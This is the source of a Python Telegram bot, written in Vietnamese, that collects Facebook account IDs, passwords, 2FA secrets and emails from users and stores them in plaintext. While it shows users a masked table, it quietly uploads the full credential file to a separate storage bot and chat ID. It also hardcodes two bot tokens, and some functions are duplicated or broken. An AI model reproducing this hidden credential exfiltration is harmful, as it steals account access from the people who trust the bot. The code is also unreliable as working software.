import logging
import os
import shutil
import json
import asyncio
from telegram import ReplyKeyboardRemove
from telegram import Bot
from telegram import Update, ReplyKeyboardMarkup, Bot
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    CallbackQueryHandler, ContextTypes, ConversationHandler
)


logging.basicConfig(level=logging.INFO)

TOKEN = "7902350236:AAFZ0uTupvu88zBtt8FXExXV1Mu5Em9GvN4"
BOT_STORAGE_TOKEN = "7941195390:AAE8iniN11JYPvJDVqNa1L1dx6xrfWANH_M"
STORAGE_CHAT_ID = 7145945924  # ID chat bot lưu trữ nhận file

UID, PASS, PASS_CONFIRM, TWO_FA, MAIL, GET_FILE_CONFIRM = range(6)
DEFAULT_PASS = "clone123"
accounts = []

AUTO_STATUS_FILE = "auto_status.json"

def load_auto_status():
    if os.path.exists(AUTO_STATUS_FILE):
        with open(AUTO_STATUS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_auto_status(data):
    with open(AUTO_STATUS_FILE, "w") as f:
        json.dump(data, f)

def mask_uid(uid):
    if len(uid) <= 5:
        return "█" * len(uid)
    return "█" * (len(uid) - 5) + uid[-5:]

def mask_pass(p):
    return "*" * len(p) if p else ""

def mask_2fa(t):
    if len(t) <= 4:
        return "█" * len(t)
    return "█" * (len(t) - 4) + t[-4:]

def mask_mail(m):
    if '@' not in m:
        return "*" * len(m)
    name, domain = m.split("@", 1)
    return "*" * len(name) + "@" + domain

def format_table(acc_list, message=""):
    now = datetime.now()
    date_str = f"{now.day:02d}|{now.month:02d}|{now.year}"
    time_str = f"{now.hour:02d}:{now.minute:02d}"
    
    lines = []
    lines.append("- bảng thông tin -")
    lines.append(f"{date_str}")
    lines.append(f"Giờ : {time_str}")
    lines.append("----------------------------------------")
    
    if not acc_list:
        lines.append("Uid   : ")
        lines.append("Pass  : ")
        lines.append("2FA   : ")
        lines.append("Mail  : ")
        lines.append("----------------------------------------")
    else:
        for acc in acc_list:
            lines.append(f"Uid   : {mask_uid(acc['uid'])}")
            lines.append(f"Pass  : {mask_pass(acc['pass'])}")
            lines.append(f"2FA   : {mask_2fa(acc['2fa'])}")
            lines.append(f"Mail  : {mask_mail(acc['mail'])}")
            lines.append("----------------------------------------")
    
    lines.append("Thông báo")
    lines.append(f"- acc add file : {len(acc_list)}")
    lines.append(f"- acc trong file : {len(acc_list)}")
    lines.append(f"- người dùng lấy file : 0")
    lines.append("----------------------------------------")
    
    if message:
        lines.append(message)
        lines.append("----------------------------------------")
    
    lines.append("Vui lòng gửi UID hoặc link Facebook của bạn:")
    
    return "\n".join(lines)

def extract_uid(text):
    import re
    m = re.search(r"profile\.php\?id=([0-9]{6,})", text)
    if m:
        return m.group(1)
    m = re.search(r"\b([0-9]{6,})\b", text)
    if m:
        return m.group(1)
    return ""

def get_filename(chat_id):
    return f"accounts_{chat_id}.txt"

def save_account_append(chat_id, acc):
    filename = get_filename(chat_id)
    line = f"{acc['uid']}|{acc['pass']}|{acc['2fa']}|{acc['mail']}\n"
    with open(filename, "a", encoding="utf-8") as f:
        f.write(line)

def load_accounts_from_file(chat_id):
    filename = get_filename(chat_id)
    acc_list = []
    if os.path.exists(filename):
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split("|")
                if len(parts) == 4:
                    acc_list.append({"uid": parts[0], "pass": parts[1], "2fa": parts[2], "mail": parts[3]})
    return acc_list

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message:
        try:
            await update.message.delete()
        except:
            pass

        chat_id = update.effective_chat.id
        context.user_data['chat_id'] = chat_id

        # Tải trạng thái auto từ file
        auto_data = load_auto_status()
        auto = auto_data.get(str(chat_id), False)
        context.user_data['auto'] = auto

        global accounts  
        accounts = load_accounts_from_file(chat_id)  
        text = format_table(accounts)  
        msg = await update.message.reply_text(text)  
        context.user_data['table_msg_id'] = msg.message_id  

        # Gửi nút phù hợp theo trạng thái auto
        if auto:
            keyboard = [[InlineKeyboardButton("OffAuto", callback_data="offauto")]]
            text_mode = "Bot đang chạy 24/24. Bạn có thể tắt auto khi muốn:"
        else:
            keyboard = [[InlineKeyboardButton("Auto", callback_data="auto")]]
            text_mode = "Chọn chế độ:"

        markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(text_mode, reply_markup=markup)

        return UID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message:
        try:
            await update.message.delete()
        except:
            pass

        chat_id = update.effective_chat.id
        context.user_data['chat_id'] = chat_id

        auto_data = load_auto_status()
        context.user_data['auto'] = auto_data.get(str(chat_id), False)

        global accounts  
        accounts = load_accounts_from_file(chat_id)  

        text = format_table(accounts)  
        msg = await update.message.reply_text(text)  
        context.user_data['table_msg_id'] = msg.message_id  

        await asyncio.sleep(1)

        if context.user_data['auto']:
            keyboard = [[InlineKeyboardButton("OffAuto", callback_data="offauto")]]
            await update.message.reply_text("Bot đang chạy 24/24! Bạn có thể tắt auto khi muốn:", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            keyboard = [[InlineKeyboardButton("Auto", callback_data="auto")]]
            await update.message.reply_text("Chọn chế độ:", reply_markup=InlineKeyboardMarkup(keyboard))

        return UID

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = query.message.chat.id
    auto_data = load_auto_status()

    if data == "auto":
        context.user_data['auto'] = True
        auto_data[str(chat_id)] = True
        save_auto_status(auto_data)

        keyboard = [[InlineKeyboardButton("OffAuto", callback_data="offauto")]]
        markup = InlineKeyboardMarkup(keyboard)

        try:
            await query.message.delete()
        except:
            pass

        await context.bot.send_message(
            chat_id=chat_id,
            text="Bot đang chạy 24/24! Bạn có thể tắt auto khi muốn:",
            reply_markup=markup
        )

    elif data == "offauto":
        context.user_data['auto'] = False
        auto_data[str(chat_id)] = False
        save_auto_status(auto_data)

        keyboard = [[InlineKeyboardButton("Auto", callback_data="auto")]]
        markup = InlineKeyboardMarkup(keyboard)

        try:
            await query.message.delete()
        except:
            pass

        await context.bot.send_message(
            chat_id=chat_id,
            text="Bot đã tắt chế độ chạy 24/24. Bạn có thể bật lại auto khi muốn:",
            reply_markup=markup
        )

async def uid_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass
    uid = extract_uid(update.message.text)
    if not uid:
        msg = await update.message.reply_text("UID không hợp lệ, vui lòng gửi lại.")
        context.user_data['last_bot_msg_id'] = msg.message_id
        return UID
    context.user_data['uid'] = uid
    msg = await update.message.reply_text(f"Bạn có muốn dùng mật khẩu mặc định '{DEFAULT_PASS}'? (yes/no)")
    context.user_data['last_bot_msg_id'] = msg.message_id
    return PASS_CONFIRM

async def pass_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass
    if 'last_bot_msg_id' in context.user_data:
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data['last_bot_msg_id'])
        except:
            pass

    text = update.message.text.lower()  
    if text == "yes":  
        context.user_data['pass'] = DEFAULT_PASS  

        keyboard = [["Skip"]]
        markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        msg = await update.message.reply_text("Vui lòng gửi 2FA hoặc nhấn Skip để bỏ qua:", reply_markup=markup)
        context.user_data['last_bot_msg_id'] = msg.message_id  
        return TWO_FA  

    elif text == "no":  
        msg = await update.message.reply_text("Vui lòng nhập mật khẩu mới:")  
        context.user_data['last_bot_msg_id'] = msg.message_id  
        return PASS  

    else:  
        msg = await update.message.reply_text("Vui lòng trả lời 'yes' hoặc 'no'.")  
        context.user_data['last_bot_msg_id'] = msg.message_id  
        return PASS_CONFIRM

async def pass_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass
    if 'last_bot_msg_id' in context.user_data:
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data['last_bot_msg_id'])
        except:
            pass

    context.user_data['pass'] = update.message.text.strip()  
    msg = await update.message.reply_text("Vui lòng gửi 2FA hoặc gửi 'skip' để bỏ qua:")  
    context.user_data['last_bot_msg_id'] = msg.message_id  
    return TWO_FA

async def twofa_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass
    if 'last_bot_msg_id' in context.user_data:
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data['last_bot_msg_id'])
        except:
            pass

    text = update.message.text.strip()  
    if text.lower() == "skip":  
        context.user_data['2fa'] = "-"  
    else:  
        context.user_data['2fa'] = text  

    msg = await update.message.reply_text("Vui lòng gửi email hoặc gửi 'skip' để bỏ qua:")  
    context.user_data['last_bot_msg_id'] = msg.message_id  
    return MAIL

async def twofa_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass

    if 'last_bot_msg_id' in context.user_data:
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data['last_bot_msg_id'])
        except:
            pass

    text = update.message.text.strip()
    if text.lower() == "skip":
        context.user_data['2fa'] = "-"
    else:
        context.user_data['2fa'] = text

    keyboard = [["Skip"]]  # Nút Skip nằm dưới bàn phím
    markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    msg = await update.message.reply_text("Vui lòng gửi email hoặc nhấn Skip để bỏ qua:", reply_markup=markup)
    context.user_data['last_bot_msg_id'] = msg.message_id

    return MAIL


async def mail_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass

    if 'last_bot_msg_id' in context.user_data:
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data['last_bot_msg_id'])
        except:
            pass

    text = update.message.text.strip()
    if text.lower() == "skip":
        context.user_data['mail'] = "-"
    else:
        context.user_data['mail'] = text

    # Tiếp tục xử lý lưu acc, gửi file, cập nhật bảng, hỏi lấy file

    acc = {
        "uid": context.user_data['uid'],
        "pass": context.user_data['pass'],
        "2fa": context.user_data['2fa'],
        "mail": context.user_data['mail'],
    }

    chat_id = context.user_data['chat_id']
    global accounts
    accounts.append(acc)

    save_account_append(chat_id, acc)  # Ghi thêm vào file

    # Gửi file txt cho bot lưu trữ
    filename = get_filename(chat_id)
    try:
        bot_storage = Bot(token=BOT_STORAGE_TOKEN)
        with open(filename, "rb") as f:
            await bot_storage.send_document(chat_id=STORAGE_CHAT_ID, document=f)
    except Exception as e:
        logging.error(f"Lỗi gửi file tới bot lưu trữ: {e}")

    # Cập nhật lại bảng thông tin (sửa nội dung tin nhắn đã gửi)
    text_table = format_table(accounts, message=f"Hệ thống phát hiện ra {len(accounts)} fb đã đc thêm vào")
    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=context.user_data['table_msg_id'], text=text_table)
    except Exception as e:
        logging.error(f"Lỗi cập nhật tin nhắn bảng: {e}")

    # Hỏi người dùng có muốn lấy file không?
    keyboard = [["Yes", "No"]]
    markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    msg = await update.message.reply_text("Bạn có muốn lấy file tài khoản vừa thêm không? (Yes/No)", reply_markup=markup)
    context.user_data['last_bot_msg_id'] = msg.message_id

    return GET_FILE_CONFIRM

async def get_file_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except:
        pass

    if 'last_bot_msg_id' in context.user_data:
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data['last_bot_msg_id'])
        except:
            pass

    chat_id = context.user_data['chat_id']
    filename = get_filename(chat_id)
    backup_filename = f"{filename}.bak"

    if update.message.text.lower() == "yes":
        # Tạo file backup
        shutil.copyfile(filename, backup_filename)

        # Gửi file backup
        try:
            with open(backup_filename, "rb") as f:
                await update.message.reply_document(document=f, caption="Đây là file tài khoản bạn vừa thêm.", reply_markup=ReplyKeyboardRemove())
        except Exception as e:
            logging.error(f"Lỗi gửi file cho người dùng: {e}")

        # Xóa nội dung file gốc
        with open(filename, "w", encoding="utf-8") as f:
            f.write("")

        # Xóa file backup
        try:
            os.remove(backup_filename)
        except:
            pass

        global accounts
        accounts = []

        # Cập nhật bảng trống
        try:
            text = format_table(accounts, message="Tất cả tài khoản đã được lấy file và reset.")
            await context.bot.edit_message_text(chat_id=chat_id, message_id=context.user_data['table_msg_id'], text=text)
        except Exception as e:
            logging.error(f"Lỗi cập nhật bảng reset: {e}")

    else:
        # Người dùng không lấy file, chỉ ẩn bàn phím
        await update.message.reply_text("Đã bỏ qua gửi file.", reply_markup=ReplyKeyboardRemove())

    return UID

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            UID: [MessageHandler(filters.TEXT & ~filters.COMMAND, uid_received)],
            PASS_CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, pass_confirm)],
            PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, pass_received)],
            TWO_FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa_received)],
            MAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, mail_received)],
            GET_FILE_CONFIRM: [MessageHandler(filters.Regex("^(Yes|No|yes|no)$"), get_file_confirm)],
        },
        fallbacks=[CommandHandler('start', start)],
        allow_reentry=True,
    )

    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_backup_file))  # <-- ở đây
    app.run_polling()
    
async def handle_backup_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender_id = update.effective_user.id
    bot_self = await context.bot.get_me()

    # Chỉ xử lý file do chính bot gửi
    if sender_id != bot_self.id:
        await update.message.reply_text("Bạn không có quyền gửi file vào đây.")
        return

    try:
        file = await update.message.document.get_file()
        await context.bot.edit_message_text(
    chat_id=chat_id,
    message_id=confirmation_msg.message_id,
    text="Đã gửi file backup cho bạn. Nội dung trong file chính đã được xoá.",
)
    except Exception as e:
        logging.error(f"Lỗi khi nhận lại file backup: {e}")
  

if __name__ == "__main__":
    main()